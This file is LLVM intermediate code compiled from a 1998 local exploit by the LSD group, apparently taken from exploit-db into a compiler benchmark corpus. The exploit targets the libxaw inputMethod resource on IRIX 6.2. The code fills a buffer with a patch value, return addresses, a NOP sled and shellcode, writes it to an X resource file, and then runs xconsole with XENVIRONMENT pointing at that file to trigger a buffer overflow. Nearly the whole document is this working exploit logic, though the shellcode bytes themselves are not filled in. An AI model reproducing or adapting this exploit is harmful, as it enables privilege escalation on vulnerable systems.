; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19684.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/local/extr_19684.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [65 x i8] c"copyright LAST STAGE OF DELIRIUM nov 1998 poland  //lsd-pl.net/\0A\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"libxaw.so inputmethod for irix 6.2 IP:17,19,20,21,22\0A\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c"usage: %s xserver:display\0A\00", align 1
@jump = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [22 x i8] c"XENVIRONMENT=resource\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"*text*international:    true\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"*shellext*inputMethod:  \00", align 1
@PCHNUM = common dso_local global i32 0, align 4
@ADRNUM = common dso_local global i32 0, align 4
@NOPNUM = common dso_local global i32 0, align 4
@nop = common dso_local global i32* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.6 = private unnamed_addr constant [9 x i8] c"resource\00", align 1
@O_CREAT = common dso_local global i32 0, align 4
@O_WRONLY = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [22 x i8] c"/usr/bin/X11/xconsole\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"lsd\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"-display\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [10000 x i8], align 16
  %7 = alloca [4 x i8], align 1
  %8 = alloca [4 x i8], align 1
  %9 = alloca i8*, align 8
  %10 = alloca [2 x i8*], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp ne i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #3
  unreachable

23:                                               ; preds = %2
  %24 = load i64, i64* @jump, align 8
  %25 = inttoptr i64 %24 to i64 (...)*
  %26 = call i64 (...) %25()
  %27 = add i64 %26, 8300
  %28 = add i64 %27, 1000
  %29 = add i64 %28, 200
  %30 = add i64 %29, 12976
  %31 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 0
  %32 = bitcast i8* %31 to i64*
  store i64 %30, i64* %32, align 1
  %33 = load i64, i64* @jump, align 8
  %34 = inttoptr i64 %33 to i64 (...)*
  %35 = call i64 (...) %34()
  %36 = add i64 %35, 8300
  %37 = add i64 %36, 500
  %38 = add i64 %37, 200
  %39 = add i64 %38, 32732
  %40 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 0
  %41 = bitcast i8* %40 to i64*
  store i64 %39, i64* %41, align 1
  %42 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  store i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i8** %42, align 16
  %43 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 1
  store i8* null, i8** %43, align 8
  %44 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %45 = call i32 @strcpy(i8* %44, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %46 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %47 = call i32 @strcat(i8* %46, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  %48 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %49 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %50 = call i32 @strlen(i8* %49)
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %48, i64 %51
  store i8* %52, i8** %9, align 8
  store i32 0, i32* %11, align 4
  br label %53

53:                                               ; preds = %65, %23
  %54 = load i32, i32* %11, align 4
  %55 = load i32, i32* @PCHNUM, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %68

57:                                               ; preds = %53
  %58 = load i32, i32* %11, align 4
  %59 = srem i32 %58, 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [4 x i8], [4 x i8]* %8, i64 0, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = load i8*, i8** %9, align 8
  %64 = getelementptr inbounds i8, i8* %63, i32 1
  store i8* %64, i8** %9, align 8
  store i8 %62, i8* %63, align 1
  br label %65

65:                                               ; preds = %57
  %66 = load i32, i32* %11, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %11, align 4
  br label %53

68:                                               ; preds = %53
  store i32 0, i32* %11, align 4
  br label %69

69:                                               ; preds = %81, %68
  %70 = load i32, i32* %11, align 4
  %71 = load i32, i32* @ADRNUM, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %84

73:                                               ; preds = %69
  %74 = load i32, i32* %11, align 4
  %75 = srem i32 %74, 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 %76
  %78 = load i8, i8* %77, align 1
  %79 = load i8*, i8** %9, align 8
  %80 = getelementptr inbounds i8, i8* %79, i32 1
  store i8* %80, i8** %9, align 8
  store i8 %78, i8* %79, align 1
  br label %81

81:                                               ; preds = %73
  %82 = load i32, i32* %11, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %11, align 4
  br label %69

84:                                               ; preds = %69
  store i32 0, i32* %11, align 4
  br label %85

85:                                               ; preds = %99, %84
  %86 = load i32, i32* %11, align 4
  %87 = load i32, i32* @NOPNUM, align 4
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %89, label %102

89:                                               ; preds = %85
  %90 = load i32*, i32** @nop, align 8
  %91 = load i32, i32* %11, align 4
  %92 = srem i32 %91, 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds i32, i32* %90, i64 %93
  %95 = load i32, i32* %94, align 4
  %96 = trunc i32 %95 to i8
  %97 = load i8*, i8** %9, align 8
  %98 = getelementptr inbounds i8, i8* %97, i32 1
  store i8* %98, i8** %9, align 8
  store i8 %96, i8* %97, align 1
  br label %99

99:                                               ; preds = %89
  %100 = load i32, i32* %11, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %11, align 4
  br label %85

102:                                              ; preds = %85
  store i32 0, i32* %11, align 4
  br label %103

103:                                              ; preds = %116, %102
  %104 = load i32, i32* %11, align 4
  %105 = load i8*, i8** @shellcode, align 8
  %106 = call i32 @strlen(i8* %105)
  %107 = icmp slt i32 %104, %106
  br i1 %107, label %108, label %119

108:                                              ; preds = %103
  %109 = load i8*, i8** @shellcode, align 8
  %110 = load i32, i32* %11, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds i8, i8* %109, i64 %111
  %113 = load i8, i8* %112, align 1
  %114 = load i8*, i8** %9, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %9, align 8
  store i8 %113, i8* %114, align 1
  br label %116

116:                                              ; preds = %108
  %117 = load i32, i32* %11, align 4
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %11, align 4
  br label %103

119:                                              ; preds = %103
  %120 = load i8*, i8** %9, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %9, align 8
  store i8 10, i8* %120, align 1
  %122 = load i32, i32* @O_CREAT, align 4
  %123 = load i32, i32* @O_WRONLY, align 4
  %124 = or i32 %122, %123
  %125 = call i32 @open(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i64 0, i64 0), i32 %124, i32 438)
  store i32 %125, i32* %12, align 4
  %126 = load i32, i32* %12, align 4
  %127 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %128 = getelementptr inbounds [10000 x i8], [10000 x i8]* %6, i64 0, i64 0
  %129 = call i32 @strlen(i8* %128)
  %130 = call i32 @write(i32 %126, i8* %127, i32 %129)
  %131 = load i32, i32* %12, align 4
  %132 = call i32 @close(i32 %131)
  %133 = load i8**, i8*** %5, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 1
  %135 = load i8*, i8** %134, align 8
  %136 = getelementptr inbounds [2 x i8*], [2 x i8*]* %10, i64 0, i64 0
  %137 = call i32 @execle(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i64 0, i64 0), i8* %135, i32 0, i8** %136)
  %138 = load i32, i32* %3, align 4
  ret i32 %138
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i8*, i32, i8**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
